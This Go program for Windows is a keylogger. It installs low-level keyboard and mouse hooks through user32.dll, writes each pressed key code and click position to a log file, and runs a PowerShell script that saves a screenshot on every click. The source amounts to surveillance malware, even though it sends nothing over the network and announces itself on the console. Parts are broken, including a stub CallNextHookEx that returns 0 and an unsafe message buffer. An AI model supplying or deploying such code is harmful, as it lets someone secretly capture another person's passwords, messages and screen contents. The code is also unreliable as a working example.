package main

import (
    "fmt"
    "os"
    "os/exec"
    "syscall"
    "unsafe"
)

var (
    moduser32            = syscall.NewLazyDLL("user32.dll")
    procSetWindowsHookEx = moduser32.NewProc("SetWindowsHookExA")
    procGetMessage       = moduser32.NewProc("GetMessageW")
)

const (
    WH_KEYBOARD_LL = 13
    WH_MOUSE_LL    = 14
    WM_KEYDOWN     = 0x0100
    WM_LBUTTONDOWN = 0x0201
    WM_RBUTTONDOWN = 0x0204
)

type KBDLLHOOKSTRUCT struct {
    VkCode      uint32
    ScanCode    uint32
    Flags       uint32
    Time        uint32
    ExtraInfo   uintptr
}

type MSLLHOOKSTRUCT struct {
    Pt          POINT
    MouseData   uint32
    Flags       uint32
    Time        uint32
    ExtraInfo   uintptr
}

type POINT struct {
    X, Y int32
}

var outputFile *os.File

func main() {
    var err error
    outputFile, err = os.OpenFile("input_log.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err != nil {
        fmt.Println("Error opening file:", err)
        return
    }
    defer outputFile.Close()

    keyboardHookID, _, _ := procSetWindowsHookEx.Call(
        WH_KEYBOARD_LL,
        syscall.NewCallback(keyboardProc),
        0,
        0,
    )
    if keyboardHookID == 0 {
        fmt.Println("Failed to set keyboard hook")
        return
    }

    mouseHookID, _, _ := procSetWindowsHookEx.Call(
        WH_MOUSE_LL,
        syscall.NewCallback(mouseProc),
        0,
        0,
    )
    if mouseHookID == 0 {
        fmt.Println("Failed to set mouse hook")
        return
    }

    fmt.Println("Hooks set. Press any key or click mouse...")

    var msg = &struct{}{}
    for {
        procGetMessage.Call(uintptr(unsafe.Pointer(msg)), 0, 0, 0)
    }
}

func keyboardProc(nCode int, wParam uintptr, lParam uintptr) uintptr {
    if nCode >= 0 && wParam == WM_KEYDOWN {
        kbdstruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
        keyStr := fmt.Sprintf("Key Pressed: %v\n", kbdstruct.VkCode)
        outputFile.WriteString(keyStr)
    }
    return CallNextHookEx(0, nCode, wParam, lParam)
}

func mouseProc(nCode int, wParam uintptr, lParam uintptr) uintptr {
    if nCode >= 0 && (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN) {
        msstruct := (*MSLLHOOKSTRUCT)(unsafe.Pointer(lParam))
        mouseStr := fmt.Sprintf("Mouse Clicked: %v, %v\n", msstruct.Pt.X, msstruct.Pt.Y)
        outputFile.WriteString(mouseStr)
        // Capture and save screenshot
        captureAndSaveScreenshot()
    }
    return CallNextHookEx(0, nCode, wParam, lParam)
}

func captureAndSaveScreenshot() {
    // PowerShell script to capture the screen
    psScript := `
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)

        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $fileName = "screenshot_" + $timestamp + ".png"
        $bitmap.Save($fileName, [System.Drawing.Imaging.ImageFormat]::Png)
    `

    // Execute the PowerShell script
    cmd := exec.Command("powershell", "-Command", psScript)
    if err := cmd.Run(); err != nil {
        fmt.Println("Failed to capture screenshot:", err)
    }
}

func CallNextHookEx(hhk uintptr, nCode int, wParam uintptr, lParam uintptr) uintptr {
    return 0 // In a real implementation, this should call the actual 'CallNextHookEx' from user32.dll
}